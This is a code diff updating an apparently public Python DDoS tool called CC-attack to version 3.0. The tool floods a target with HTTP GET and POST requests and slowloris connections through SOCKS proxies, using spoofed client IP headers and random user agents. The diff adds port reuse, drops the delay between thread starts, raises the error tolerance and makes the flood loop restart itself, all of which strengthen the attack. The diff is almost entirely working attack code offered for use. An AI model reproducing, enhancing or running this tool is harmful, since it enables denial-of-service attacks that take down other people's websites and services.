@@ -6,6 +6,9 @@
 # give more performance when flooding.  #
 #                           -- L330n123 #
 #########################################
+'''
+I'm working on Aoyama's update so this project will stop for a while
+'''
 import requests
 import socket
 import socks
@@ -25,19 +28,19 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.9 (Improvement)
+Python3 version 3.0 (Improvement)
                             C0d3d by L330n123
-╔═════════════════════════════════════════════╗
-║        Tos: Don't attack .gov website       ║
-║─────────────────────────────────────────────║
-║                 New stuff:                  ║
-║          + Added Random client ip           ║
-║          + Added socks mode selection       ║
-║          + Fixed slow mode                  ║
-║          + More Human-like options          ║
-║─────────────────────────────────────────────║
-║ Link: https://github.com/Leeon123/CC-attack ║
-╚═════════════════════════════════════════════╝''')
+┌─────────────────────────────────────────────┐
+│        Tos: Don't attack .gov website       │
+├─────────────────────────────────────────────┤
+│                 New stuff:                  │
+│          + Fast Port Re-use                 │
+│          + Added Random client ip           │
+│          + Added socks mode selection       │
+│          + Fixed slow mode                  │
+├─────────────────────────────────────────────┤
+│ Link: https://github.com/Leeon123/CC-attack │
+└─────────────────────────────────────────────┘''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
 			"Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -204,7 +207,6 @@ def cc(socks_type):
 	while True:
 		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
 		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
-		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 		accept = random.choice(acceptall)
 		referer = "Referer: "+random.choice(referers)+ ip + url2 + "\r\n"
 		try:
@@ -213,25 +215,29 @@ def cc(socks_type):
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			if err > 3:
+			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
 			s = socks.socksocket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				s = ssl.wrap_socket(s)
 			print ("[*] "+n+" Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 			try:
 				for _ in range(multiple):
+					useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
 					get_host = "GET " + url2 + "?" + random.choice(strings)+str(random.randint(0,271400281257))+random.choice(strings)+str(random.randint(0,271004281257))+random.choice(strings) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 					request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
 					s.send(str.encode(request))
-				#s.close()
+				s.close()
 			except:
 				s.close()
 		except:
 			s.close()
 			err = err +1
+	cc(socks_type)
+
 def post(socks_type):
 	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
 	content = "Content-Type: application/x-www-form-urlencoded\r\n"
@@ -254,10 +260,11 @@ def post(socks_type):
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True)
 			if socks_type == 5:
 				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
-			if err > 3:
+			if err > 10:
 				print("[!] Target or proxy maybe down| Changing proxy")
 				break
 			s = socks.socksocket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				s = ssl.wrap_socket(s)
@@ -266,7 +273,7 @@ def post(socks_type):
 			try:
 				for _ in range(multiple):
 					s.send(str.encode(request))
-				#s.close()
+				s.close()
 			except:
 				s.close()
 		except:
@@ -284,6 +291,7 @@ def slow(conn,socks_type):
 	for _ in range(conn):
 		try:
 			s = socks.socksocket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.settimeout(0.6)
 			s.connect((str(ip), int(port)))
 			if str(port) == '443':
@@ -358,6 +366,7 @@ def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 			break
 		try:
 			s = socks.socksocket()
+			s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 			s.settimeout(ms)#You can change by yourself
 			s.connect((str(ip), int(port)))
 			if port == 443:
@@ -656,14 +665,12 @@ def main():
 				th = threading.Thread(target = post,args=(socks_type,))
 				th.setDaemon(True)
 				th.start()
-				time.sleep(0.03)
 				#print("Threads "+str(i+1)+" created")
 		elif mode == "cc":
 			for _ in range(thread_num):
 				th = threading.Thread(target = cc,args=(socks_type,))
 				th.setDaemon(True)
 				th.start()
-				time.sleep(0.03)
 					#print("Threads "+str(i+1)+" created")
 	try:
 		while True:
